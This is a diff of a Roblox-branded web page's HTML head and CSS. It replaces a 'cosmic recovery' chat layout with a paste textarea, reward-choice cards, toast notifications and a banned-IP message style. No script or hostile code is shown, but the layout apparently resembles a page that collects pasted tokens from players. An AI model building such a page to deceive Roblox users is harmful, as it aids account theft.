@@ -3,10 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>CELESTIA ✦ cosmic recovery</title>
+    <title>AURORA • Roblox</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Clash+Display:wght@300;400;500;600;700&display=swap');
-        @import url('https://fonts.googleapis.com/css2?family=Satoshi:wght@300;400;500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap');
 
         * {
             margin: 0;
@@ -14,22 +13,9 @@
             box-sizing: border-box;
         }
 
-        :root {
-            --glow-color: #c084fc;
-            --glow-secondary: #38bdf8;
-            --dark-bg: #0b0b1a;
-            --card-bg: rgba(18, 18, 35, 0.95);
-            --text-primary: #ffffff;
-            --text-secondary: #e0e0ff;
-            --text-muted: #b0b0d0;
-            --success: #10b981;
-            --error: #ef4444;
-            --warning: #f59e0b;
-        }
-
         body {
-            background: var(--dark-bg);
-            font-family: 'Satoshi', sans-serif;
+            background: #03050a;
+            font-family: 'Space Grotesk', sans-serif;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -37,317 +23,276 @@
             padding: 20px;
             position: relative;
             overflow-x: hidden;
-            color: var(--text-primary);
         }
 
-        /* Efeito de partículas flutuantes */
-        .particles {
+        /* Background com efeito de estrelas */
+        .stars {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
+            pointer-events: none;
             z-index: 0;
         }
 
-        .particle {
+        .star {
             position: absolute;
-            width: 2px;
-            height: 2px;
-            background: rgba(192, 132, 252, 0.3);
+            background: white;
             border-radius: 50%;
-            animation: float 15s infinite linear;
-        }
-
-        @keyframes float {
-            from {
-                transform: translateY(100vh) rotate(0deg);
-            }
-            to {
-                transform: translateY(-100px) rotate(360deg);
-            }
-        }
-
-        /* Anéis orbitais */
-        .orbital-ring {
-            position: fixed;
-            border-radius: 50%;
-            border: 1px solid rgba(192, 132, 252, 0.1);
-            animation: rotate 20s linear infinite;
-            z-index: 0;
-        }
-
-        .ring-1 {
-            width: 600px;
-            height: 600px;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            border-color: rgba(56, 189, 248, 0.1);
-        }
-
-        .ring-2 {
-            width: 400px;
-            height: 400px;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            border-color: rgba(192, 132, 252, 0.15);
-            animation-direction: reverse;
-        }
-
-        .ring-3 {
-            width: 200px;
-            height: 200px;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            border-color: rgba(56, 189, 248, 0.2);
-        }
-
-        @keyframes rotate {
-            from { transform: translate(-50%, -50%) rotate(0deg); }
-            to { transform: translate(-50%, -50%) rotate(360deg); }
-        }
-
-        /* Container principal - AGORA EM COLUNA ÚNICA */
-        .cosmic-container {
-            width: 100%;
-            max-width: 560px;
-            position: relative;
-            z-index: 10;
-            margin: 0 auto;
-        }
-
-        /* Cards com design exclusivo */
-        .cosmic-card {
-            background: var(--card-bg);
-            backdrop-filter: blur(30px);
-            -webkit-backdrop-filter: blur(30px);
-            border-radius: 48px;
-            padding: 36px 32px;
-            border: 1px solid rgba(192, 132, 252, 0.3);
-            box-shadow: 
-                0 40px 80px -20px rgba(0, 0, 0, 0.8),
-                0 0 0 1px rgba(255, 255, 255, 0.02) inset,
-                0 0 60px rgba(192, 132, 252, 0.3);
-            transition: all 0.4s;
-            position: relative;
-            overflow: hidden;
-            margin-bottom: 20px;
-        }
-
-        .cosmic-card:last-child {
-            margin-bottom: 0;
-        }
-
-        .cosmic-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, var(--glow-color), var(--glow-secondary), transparent);
-            animation: borderGlow 3s linear infinite;
-        }
-
-        @keyframes borderGlow {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-
-        /* Header cósmico */
-        .cosmic-header {
-            margin-bottom: 32px;
-            display: flex;
-            align-items: center;
-            gap: 16px;
-        }
-
-        .constellation {
-            width: 70px;
-            height: 70px;
-            background: rgba(255, 255, 255, 0.02);
-            border-radius: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 36px;
-            position: relative;
-            border: 1px solid rgba(192, 132, 252, 0.3);
-        }
-
-        .cosmic-title {
-            font-family: 'Clash Display', sans-serif;
-            font-size: 48px;
-            font-weight: 600;
-            background: linear-gradient(135deg, #ffffff, #c0a0ff);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            line-height: 1;
-            letter-spacing: -1px;
-        }
-
-        .cosmic-subtitle {
-            color: var(--text-secondary);
-            font-size: 15px;
-            letter-spacing: 1px;
-            margin-top: 4px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .cosmic-subtitle::before {
-            content: '✦';
-            color: var(--glow-color);
-            animation: twinkle 1.5s infinite;
+            animation: twinkle var(--duration) infinite;
+            opacity: 0;
         }
 
         @keyframes twinkle {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
+            0%, 100% { opacity: 0; transform: scale(0.5); }
+            50% { opacity: var(--opacity); transform: scale(1); }
         }
 
-        /* Estatísticas */
-        .orbit-stats {
+        /* Gradiente animado */
+        .aurora {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 30% 50%, rgba(99, 102, 241, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 70% 30%, rgba(236, 72, 153, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 10% 80%, rgba(139, 92, 246, 0.15) 0%, transparent 50%);
+            filter: blur(40px);
+            animation: auroraMove 20s ease infinite;
+            z-index: 0;
+        }
+
+        @keyframes auroraMove {
+            0%, 100% { transform: scale(1) rotate(0deg); }
+            33% { transform: scale(1.1) rotate(1deg); }
+            66% { transform: scale(0.9) rotate(-1deg); }
+        }
+
+        .container {
+            width: 100%;
+            max-width: 520px;
+            position: relative;
+            z-index: 10;
+        }
+
+        /* Páginas */
+        .page {
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* Cards com efeito glass premium */
+        .card {
+            background: rgba(10, 15, 25, 0.7);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 48px;
+            padding: 36px 32px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 
+                0 30px 60px -15px rgba(0, 0, 0, 0.8),
+                0 0 0 1px rgba(255, 255, 255, 0.02) inset,
+                0 0 80px rgba(99, 102, 241, 0.1);
+        }
+
+        /* Header */
+        .header {
             display: flex;
-            justify-content: space-around;
+            align-items: center;
+            gap: 20px;
             margin-bottom: 40px;
-            position: relative;
         }
 
-        .orbit-item {
-            text-align: center;
-            position: relative;
-            width: 90px;
-            height: 90px;
+        .logo {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #6366f1, #a855f7, #ec4899);
+            border-radius: 24px;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px dashed rgba(192, 132, 252, 0.3);
-            animation: orbitPulse 3s infinite;
-            cursor: pointer;
+            font-size: 38px;
+            box-shadow: 0 20px 40px rgba(99, 102, 241, 0.4);
+            position: relative;
+            overflow: hidden;
         }
 
-        .orbit-item:nth-child(2) { animation-delay: 0.5s; }
-        .orbit-item:nth-child(3) { animation-delay: 1s; }
-
-        @keyframes orbitPulse {
-            0%, 100% { border-color: rgba(192, 132, 252, 0.3); }
-            50% { border-color: rgba(56, 189, 248, 0.5); }
+        .logo::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            animation: shine 3s infinite;
         }
 
-        .orbit-value {
-            font-size: 28px;
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        .header-text {
+            flex: 1;
+        }
+
+        .title {
+            font-size: 36px;
             font-weight: 700;
-            background: linear-gradient(135deg, var(--glow-color), var(--glow-secondary));
+            background: linear-gradient(135deg, #fff, #cbd5e1);
             -webkit-background-clip: text;
             background-clip: text;
             -webkit-text-fill-color: transparent;
-            line-height: 1;
+            line-height: 1.2;
+            margin-bottom: 6px;
+            letter-spacing: -0.5px;
         }
 
-        .orbit-label {
-            color: var(--text-muted);
-            font-size: 11px;
+        .subtitle {
+            color: #6b7280;
+            font-size: 15px;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+        }
+
+        /* Stats modernas */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 35px;
+        }
+
+        .stat-block {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 28px;
+            padding: 18px 10px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(5px);
+            transition: all 0.3s;
+        }
+
+        .stat-block:hover {
+            border-color: rgba(99, 102, 241, 0.3);
+            transform: translateY(-5px);
+            background: rgba(99, 102, 241, 0.05);
+        }
+
+        .stat-value {
+            font-size: 28px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #6366f1, #a855f7);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 6px;
+        }
+
+        .stat-label {
+            color: #6b7280;
+            font-size: 12px;
+            font-weight: 500;
             text-transform: uppercase;
             letter-spacing: 1px;
-            margin-top: 4px;
         }
 
-        /* Input */
-        .nebula-input {
-            margin-bottom: 32px;
+        /* Input Area */
+        .input-section {
+            margin-bottom: 28px;
         }
 
-        .nebula-label {
+        .input-label {
             display: flex;
             align-items: center;
             gap: 8px;
-            color: var(--text-secondary);
-            font-size: 15px;
-            font-weight: 600;
+            color: #9ca3af;
+            font-size: 14px;
+            font-weight: 500;
             margin-bottom: 12px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
         }
 
-        .nebula-label span {
-            color: var(--glow-color);
+        .input-label span {
+            color: #6366f1;
             font-size: 18px;
         }
 
-        .input-cosmic {
+        .input-wrapper {
             position: relative;
+            margin-bottom: 12px;
         }
 
-        .input-cosmic textarea {
+        textarea {
             width: 100%;
-            height: 130px;
-            background: rgba(0, 0, 0, 0.5);
-            border: 2px solid rgba(192, 132, 252, 0.3);
+            height: 120px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 2px solid rgba(255, 255, 255, 0.05);
             border-radius: 32px;
             color: white;
             padding: 20px 24px;
-            font-family: 'Monaco', monospace;
-            font-size: 15px;
+            font-family: 'Monaco', 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.5;
             resize: vertical;
             transition: all 0.3s;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
         }
 
-        .input-cosmic textarea:focus {
+        textarea:focus {
             outline: none;
-            border-color: var(--glow-color);
-            box-shadow: 0 20px 60px rgba(192, 132, 252, 0.4);
+            border-color: #6366f1;
+            background: rgba(20, 25, 40, 0.8);
+            box-shadow: 0 10px 40px rgba(99, 102, 241, 0.2);
         }
 
-        .cosmic-preview {
+        .preview-badge {
             display: flex;
             align-items: center;
             gap: 12px;
-            background: rgba(0, 0, 0, 0.3);
+            background: rgba(0, 0, 0, 0.2);
             padding: 16px 22px;
             border-radius: 60px;
-            border: 1px solid rgba(192, 132, 252, 0.2);
-            margin-top: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            margin-top: 10px;
         }
 
-        .cosmic-dot {
-            width: 12px;
-            height: 12px;
-            background: var(--success);
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background: #10b981;
             border-radius: 50%;
-            box-shadow: 0 0 20px var(--success);
-            animation: pulse 2s infinite;
+            box-shadow: 0 0 20px #10b981;
+            animation: pulseDot 2s infinite;
         }
 
-        @keyframes pulse {
+        @keyframes pulseDot {
             0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(1.3); }
+            50% { opacity: 0.5; transform: scale(1.2); }
         }
 
-        .cosmic-preview-text {
-            color: var(--text-secondary);
-            font-size: 14px;
-            font-weight: 500;
+        .preview-text {
+            color: #9ca3af;
+            font-size: 13px;
+            font-weight: 400;
         }
 
         /* Botão principal */
-        .wormhole-btn {
+        .action-btn {
             width: 100%;
-            background: linear-gradient(135deg, rgba(192, 132, 252, 0.2), rgba(56, 189, 248, 0.2));
-            border: 2px solid;
-            border-image: linear-gradient(135deg, var(--glow-color), var(--glow-secondary)) 1;
+            background: linear-gradient(135deg, #6366f1, #a855f7, #ec4899);
+            background-size: 200% 200%;
+            border: none;
             border-radius: 60px;
             color: white;
-            font-weight: 700;
+            font-weight: 600;
             font-size: 18px;
             padding: 22px;
             cursor: pointer;
@@ -356,430 +301,357 @@
             align-items: center;
             justify-content: center;
             gap: 12px;
+            box-shadow: 0 20px 40px rgba(99, 102, 241, 0.4);
             position: relative;
             overflow: hidden;
-            backdrop-filter: blur(10px);
-            letter-spacing: 2px;
-            text-transform: uppercase;
+            animation: gradientFlow 3s ease infinite;
         }
 
-        .wormhole-btn:hover {
-            transform: scale(1.02);
-            border-color: var(--glow-color);
-            box-shadow: 0 30px 60px rgba(192, 132, 252, 0.4);
+        @keyframes gradientFlow {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
         }
 
-        /* Grid de escolha */
-        .constellation-grid {
+        .action-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.6s;
+        }
+
+        .action-btn:hover::before {
+            left: 100%;
+        }
+
+        .action-btn:active {
+            transform: scale(0.96);
+            box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3);
+        }
+
+        /* Status message */
+        .status-message {
+            text-align: center;
+            margin-top: 24px;
+            padding: 14px;
+            border-radius: 40px;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+
+        /* Exibição de informações extras */
+        .info-row {
+            margin-top: 12px;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .info-text {
+            color: #9ca3af;
+            font-size: 13px;
+        }
+
+        /* Footer */
+        .footer {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 35px;
+        }
+
+        .footer-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #4b5563;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .footer-item span {
+            color: #6366f1;
+            font-size: 16px;
+        }
+
+        /* TELA 2 - ESCOLHA */
+        .choice-title {
+            font-size: 34px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff, #cbd5e1);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .choice-grid {
             display: grid;
-            grid-template-columns: repeat(2, 1fr);
             gap: 16px;
-            margin: 32px 0;
+            margin: 35px 0;
         }
 
-        .constellation-item {
+        .choice-item {
             background: rgba(255, 255, 255, 0.02);
-            border: 1px solid rgba(192, 132, 252, 0.2);
-            border-radius: 32px;
-            padding: 24px;
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255, 255, 255, 0.03);
+            border-radius: 36px;
+            padding: 22px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
             cursor: pointer;
             transition: all 0.3s;
             position: relative;
             overflow: hidden;
         }
 
-        .constellation-item:hover {
-            transform: translateY(-8px);
-            border-color: var(--glow-color);
-            background: rgba(192, 132, 252, 0.1);
-            box-shadow: 0 20px 40px rgba(192, 132, 252, 0.3);
+        .choice-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(to bottom, #6366f1, #ec4899);
+            opacity: 0;
+            transition: opacity 0.3s;
         }
 
-        .item-icon {
-            width: 60px;
-            height: 60px;
-            background: rgba(192, 132, 252, 0.1);
-            border-radius: 20px;
+        .choice-item:hover {
+            border-color: #6366f1;
+            background: rgba(99, 102, 241, 0.05);
+            transform: translateX(10px);
+            box-shadow: 0 10px 30px rgba(99, 102, 241, 0.2);
+        }
+
+        .choice-item:hover::before {
+            opacity: 1;
+        }
+
+        .choice-icon {
+            width: 75px;
+            height: 75px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 28px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 32px;
-            margin-bottom: 16px;
-            border: 1px solid rgba(192, 132, 252, 0.3);
+            font-size: 38px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
         }
 
-        .item-name {
-            font-size: 22px;
+        .choice-content {
+            flex: 1;
+        }
+
+        .choice-name {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            background: linear-gradient(to right, #fff, #e2e8f0);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .choice-desc {
+            color: #6b7280;
+            font-size: 14px;
+            font-weight: 400;
+        }
+
+        .choice-value {
+            font-size: 32px;
             font-weight: 700;
+            color: #10b981;
+            text-shadow: 0 0 20px rgba(16, 185, 129, 0.3);
+        }
+
+        .choice-badge {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #f43f5e, #ec4899);
+            color: white;
+            padding: 6px 18px;
+            border-radius: 40px;
+            font-size: 13px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            box-shadow: 0 5px 20px rgba(244, 63, 94, 0.4);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .back-button {
+            width: 100%;
+            background: transparent;
+            border: 2px solid rgba(255, 255, 255, 0.05);
+            border-radius: 40px;
+            color: #9ca3af;
+            font-weight: 500;
+            font-size: 16px;
+            padding: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .back-button:hover {
+            border-color: #6366f1;
+            color: white;
+            background: rgba(99, 102, 241, 0.1);
+            transform: translateX(-5px);
+        }
+
+        /* NOTIFICAÇÃO PROFISSIONAL */
+        .notification {
+            position: fixed;
+            top: 30px;
+            right: 30px;
+            background: rgba(20, 25, 40, 0.95);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 20px 24px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.02) inset;
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            transform: translateX(400px);
+            transition: transform 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            z-index: 1000;
+            max-width: 380px;
+        }
+
+        .notification.show {
+            transform: translateX(0);
+        }
+
+        .notification-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #10b981, #059669);
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            box-shadow: 0 10px 20px rgba(16, 185, 129, 0.3);
+        }
+
+        .notification-content {
+            flex: 1;
+        }
+
+        .notification-title {
+            font-size: 18px;
+            font-weight: 600;
             color: white;
             margin-bottom: 4px;
         }
 
-        .item-desc {
-            color: var(--text-muted);
+        .notification-message {
             font-size: 14px;
-        }
-
-        .item-badge {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            background: linear-gradient(135deg, var(--glow-color), var(--glow-secondary));
-            color: white;
-            padding: 6px 14px;
-            border-radius: 30px;
-            font-size: 12px;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-        }
-
-        /* Chat - AGORA TAMBÉM RETO */
-        .deep-space-chat {
-            background: rgba(8, 8, 20, 0.98);
-            backdrop-filter: blur(20px);
-            border-radius: 48px;
-            padding: 28px;
-            height: 650px;
-            display: flex;
-            flex-direction: column;
-            border: 1px solid rgba(192, 132, 252, 0.3);
-            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
-        }
-
-        .chat-header-cosmic {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            margin-bottom: 24px;
-            padding-bottom: 24px;
-            border-bottom: 1px solid rgba(192, 132, 252, 0.3);
-        }
-
-        .chat-avatar-cosmic {
-            width: 70px;
-            height: 70px;
-            background: linear-gradient(135deg, var(--glow-color), var(--glow-secondary));
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 36px;
-            animation: floatAvatar 3s ease infinite;
-            box-shadow: 0 20px 40px rgba(192, 132, 252, 0.3);
-        }
-
-        @keyframes floatAvatar {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-5px); }
-        }
-
-        .chat-info-cosmic {
-            flex: 1;
-        }
-
-        .chat-name-cosmic {
-            font-size: 26px;
-            font-weight: 700;
-            background: linear-gradient(to right, #fff, #c0a0ff);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 6px;
-        }
-
-        .chat-status-cosmic {
-            color: var(--success);
-            font-size: 15px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-weight: 500;
-        }
-
-        .chat-status-cosmic::before {
-            content: '';
-            width: 10px;
-            height: 10px;
-            background: var(--success);
-            border-radius: 50%;
-            display: inline-block;
-            animation: pulse 2s infinite;
-        }
-
-        .close-chat-cosmic {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            color: white;
-            font-size: 24px;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .close-chat-cosmic:hover {
-            background: var(--error);
-            transform: scale(1.1);
-        }
-
-        /* Mensagens do chat */
-        .cosmic-messages {
-            flex: 1;
-            overflow-y: auto;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-            background: rgba(0, 0, 0, 0.4);
-            border-radius: 32px;
-            margin: 16px 0;
-        }
-
-        .cosmic-message {
-            max-width: 90%;
-            padding: 16px 22px;
-            border-radius: 28px;
-            animation: messageFloat 0.3s ease;
-            position: relative;
-            font-size: 16px;
-            line-height: 1.6;
-            font-weight: 500;
-        }
-
-        .cosmic-message.support {
-            background: rgba(192, 132, 252, 0.25);
-            border: 2px solid rgba(192, 132, 252, 0.5);
-            align-self: flex-start;
-            border-bottom-left-radius: 5px;
-            color: white;
-            text-shadow: 0 0 10px rgba(255,255,255,0.3);
-        }
-
-        .cosmic-message.user {
-            background: rgba(56, 189, 248, 0.25);
-            border: 2px solid rgba(56, 189, 248, 0.5);
-            align-self: flex-end;
-            border-bottom-right-radius: 5px;
-            color: white;
-            text-shadow: 0 0 10px rgba(255,255,255,0.3);
-        }
-
-        @keyframes messageFloat {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .message-time-cosmic {
-            font-size: 11px;
-            color: var(--text-muted);
-            margin-top: 8px;
-            text-align: right;
+            color: #9ca3af;
             font-weight: 400;
         }
 
-        /* Input do chat */
-        .cosmic-input-area {
-            display: flex;
-            gap: 12px;
-            margin-top: 16px;
-        }
-
-        .cosmic-chat-input {
-            flex: 1;
-            background: rgba(0, 0, 0, 0.5);
-            border: 2px solid rgba(192, 132, 252, 0.3);
-            border-radius: 40px;
-            padding: 18px 24px;
-            color: white;
-            font-size: 16px;
-            transition: all 0.3s;
-        }
-
-        .cosmic-chat-input:focus {
-            outline: none;
-            border-color: var(--glow-color);
-            background: rgba(0, 0, 0, 0.7);
-            box-shadow: 0 0 30px rgba(192, 132, 252, 0.3);
-        }
-
-        .cosmic-send {
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, var(--glow-color), var(--glow-secondary));
+        .notification-close {
+            background: transparent;
             border: none;
-            color: white;
-            font-size: 28px;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 15px 30px rgba(192, 132, 252, 0.3);
-        }
-
-        .cosmic-send:hover {
-            transform: scale(1.1) rotate(10deg);
-            box-shadow: 0 0 40px var(--glow-color);
-        }
-
-        /* Quick actions */
-        .stellar-actions {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
-            margin: 16px 0;
-        }
-
-        .stellar-btn {
-            background: rgba(192, 132, 252, 0.15);
-            border: 2px solid rgba(192, 132, 252, 0.3);
-            border-radius: 40px;
-            padding: 14px;
-            color: white;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-size: 15px;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .stellar-btn:hover {
-            background: rgba(192, 132, 252, 0.3);
-            border-color: var(--glow-color);
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(192, 132, 252, 0.3);
-        }
-
-        /* Typing indicator */
-        .cosmic-typing {
-            display: flex;
-            gap: 8px;
-            padding: 18px 24px;
-            background: rgba(192, 132, 252, 0.15);
-            border-radius: 40px;
-            width: fit-content;
-            align-self: flex-start;
-            border: 2px solid rgba(192, 132, 252, 0.3);
-        }
-
-        .cosmic-typing span {
-            width: 12px;
-            height: 12px;
-            background: var(--glow-color);
-            border-radius: 50%;
-            animation: cosmicTyping 1.4s infinite;
-        }
-
-        .cosmic-typing span:nth-child(2) { animation-delay: 0.2s; }
-        .cosmic-typing span:nth-child(3) { animation-delay: 0.4s; }
-
-        @keyframes cosmicTyping {
-            0%, 60%, 100% { transform: translateY(0); }
-            30% { transform: translateY(-12px); }
-        }
-
-        /* Notificação */
-        .cosmic-notification {
-            position: fixed;
-            top: 30px;
-            right: 30px;
-            background: rgba(18, 18, 35, 0.98);
-            backdrop-filter: blur(30px);
-            border-radius: 32px;
-            padding: 22px 30px;
-            border: 1px solid rgba(192, 132, 252, 0.4);
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), 0 0 50px rgba(192, 132, 252, 0.3);
-            display: flex;
-            align-items: center;
-            gap: 22px;
-            transform: translateX(500px);
-            transition: transform 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-            z-index: 1000;
-            max-width: 400px;
-        }
-
-        .cosmic-notification.show {
-            transform: translateX(0);
-        }
-
-        .notification-icon-cosmic {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, var(--glow-color), var(--glow-secondary));
-            border-radius: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 32px;
-            animation: spin 10s linear infinite;
-        }
-
-        .notification-content-cosmic {
-            flex: 1;
-        }
-
-        .notification-title-cosmic {
+            color: #6b7280;
             font-size: 20px;
-            font-weight: 700;
+            cursor: pointer;
+            padding: 5px;
+            transition: color 0.2s;
+        }
+
+        .notification-close:hover {
             color: white;
-            margin-bottom: 6px;
         }
 
-        .notification-message-cosmic {
-            font-size: 16px;
-            color: var(--text-secondary);
-        }
-
-        .cosmic-progress {
+        .notification-progress {
             position: absolute;
             bottom: 0;
             left: 0;
-            height: 4px;
-            background: linear-gradient(90deg, var(--glow-color), var(--glow-secondary));
-            border-radius: 0 0 0 32px;
-            animation: cosmicProgress 4s linear forwards;
+            height: 3px;
+            background: linear-gradient(90deg, #10b981, #059669);
+            border-radius: 0 0 0 24px;
+            width: 100%;
+            animation: progress 4s linear forwards;
         }
 
-        @keyframes cosmicProgress {
+        @keyframes progress {
             from { width: 100%; }
             to { width: 0%; }
         }
 
         /* Loading spinner */
-        .cosmic-spinner {
-            width: 30px;
-            height: 30px;
-            border: 4px solid rgba(192, 132, 252, 0.2);
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
             border-radius: 50%;
-            border-top-color: var(--glow-color);
-            border-right-color: var(--glow-secondary);
-            animation: cosmicSpin 1s linear infinite;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
             margin: 0 auto;
         }
 
-        @keyframes cosmicSpin {
+        @keyframes spin {
             to { transform: rotate(360deg); }
         }
 
-        /* Mensagem de ban */
-        .banned-cosmic {
-            background: rgba(239, 68, 68, 0.15);
-            border: 2px solid var(--error);
+        /* Mensagem de confirmação */
+        .success-check {
+            color: #10b981;
+            font-size: 40px;
+            text-align: center;
+            animation: popIn 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0) rotate(-10deg); }
+            80% { transform: scale(1.1) rotate(2deg); }
+            100% { transform: scale(1) rotate(0); }
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .card { padding: 28px 20px; border-radius: 36px; }
+            .title { font-size: 30px; }
+            .logo { width: 60px; height: 60px; font-size: 32px; }
+            .choice-icon { width: 60px; height: 60px; font-size: 32px; }
+            .choice-name { font-size: 20px; }
+            .choice-value { font-size: 26px; }
+            .notification { left: 20px; right: 20px; max-width: none; }
+        }
+
+        /* Estilo para IP banido */
+        .banned-message {
